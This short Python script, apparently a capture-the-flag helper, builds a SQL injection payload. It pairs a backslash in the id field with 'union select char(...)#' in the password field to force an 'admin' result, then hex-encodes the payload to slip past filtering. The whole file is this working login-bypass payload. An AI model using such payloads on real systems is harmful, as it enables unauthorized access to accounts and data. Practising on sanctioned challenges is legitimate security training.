import binascii

id='\\'
pw=b'union select char(97,100,109,105,110)#'

hex_pw = binascii.hexlify(pw)
print(hex_pw)